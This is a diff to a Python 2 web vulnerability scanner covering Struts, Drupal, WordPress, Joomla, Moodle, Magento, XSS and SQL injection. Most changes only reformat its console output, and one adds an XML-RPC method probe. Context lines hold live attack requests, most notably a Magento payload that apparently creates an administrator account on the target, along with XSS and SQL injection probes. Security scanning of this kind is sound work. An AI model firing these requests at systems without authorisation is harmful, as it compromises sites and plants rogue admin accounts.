@@ -177,7 +177,9 @@ class strutscan(vulndetector):
 
 	def launchExploitFilename(self,dirurl):
 		if self.launchExploitCVE_2013_2251(dirurl):
-			print "VULNERABLE TO CVE2013-2251: ",dirurl
+			cve = 'CVE2013-2251'
+			print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
+			#print "VULNERABLE TO CVE2013-2251: ",dirurl
 		
 	def launchExploitCVE_2013_2251(self,dirurl):
 		cve = 'cve-2013-2251'
@@ -278,9 +280,9 @@ class drupalscan(vulndetector):
 		try:
 			response = self.req.s.post(self.cmsroot, data=post_params, params=get_params,timeout=4,verify=False)
 			if response is not None and tocheck in response.text:
-				print response.text
-				self.detections.append("[ "+dirurl+" ] ====== VULNERABLE TO: "+cve+" ======\n"+response.text)
-				print '*'*30,'\nVulnerable to %s\n' % cve,'*'*30
+				#print response.text
+				self.detections.append("[ "+dirurl+" ] ====== VULNERABLE TO: "+cve+" ======\n")
+				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
 				return True
 			return False
 		except Exception as e:
@@ -319,15 +321,29 @@ class wordpresscan(vulndetector):
 		
 	def launchXMLRPC(self):
 		#print 'WORDPRESS VULN trying xmlrpc'
-		cve = 'xmlrpc'
+		cve = 'xmlrpc methods exposed'
+		datos = """
+		<?xml version="1.0"?>
+		<methodCall><methodName>system.listMethods</methodName>
+			<params><param></param></params>
+		</methodCall>
+		"""
 		fullurl = self.cmsroot+'xmlrpc.php'
 		#print "fullurl ",fullurl
-		response = self.req.getHTMLCode(fullurl)
-		tocheck = 'XML-RPC server accepts POST requests only'
+		try:
+			response = self.req.s.post(fullurl,data=datos)
+		except Exception as e:
+			print e
+			return False
+		tocheck = '<string>system.multicall</string>'
 		try:
 			if tocheck in response.text:
-				print 'es vulnerable ',fullurl
-				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" ===========")
+				#print 'es vulnerable ',fullurl
+				
+				#print '*'*30,'\nVulnerable to %s\n' % cve,'*'*30
+				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
+				print response.text
+				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" ===========" + response.text)
 				return True
 			return False
 		except Exception as e:
@@ -374,8 +390,14 @@ class joomlascan(vulndetector):
 		tocheck = 'truerandomtruerandom'
 		try:
 			if tocheck in response.text:
-				print 'es vulnerable ',fullurl
-				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" ==========")
+				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
+				res = ''
+				try:
+					m = re.search('Unknown column .*',response.text)
+					if m: res = m.group(0)
+				except Exception as e:
+					pass
+				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" =========="+res)
 				return True
 			return False
 		except Exception as e:
@@ -421,7 +443,7 @@ class moodlescan(vulndetector):
 		tocheck = '<script>alert("truerandom")</script>'
 		try:
 			if tocheck in response.text:
-				print 'es vulnerable ',fullurl
+				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
 				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" =====")
 				return True
 			return False
@@ -478,7 +500,7 @@ class magentoscan(vulndetector):
 		r = self.req.s.post(fullurl,data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ","filter": base64.b64encode(pfilter),"forwarded": 1})
 		try:
 			if r.ok:
-				print 'vuln detected: ',fullurl
+				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
 				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve + "  ==== Login as admin with truerandom:truerandomtruerandom")
 				return True
 			return False
@@ -525,6 +547,7 @@ class xssscan(vulndetector):
 			response = self.req.getHTMLCode(fullurl)
 			try:
 				if tocheck in response.text:
+					print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
 					toappend = "[ "+injectionurl+" ] ====== VULNERABLE TO: "+cve+" ====="
 					if toappend not in self.detections:
 						self.detections.append(toappend)
@@ -585,6 +608,7 @@ class sqliscan(vulndetector):
 			response = self.req.getHTMLCode(fullurl)
 			try:
 				if re.findall(self.pat,response.text):
+					print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
 					toappend = "[ "+injectionurl+" ] ====== VULNERABLE TO: "+cve+" ====="
 					if toappend not in self.detections:
 						self.detections.append(toappend)
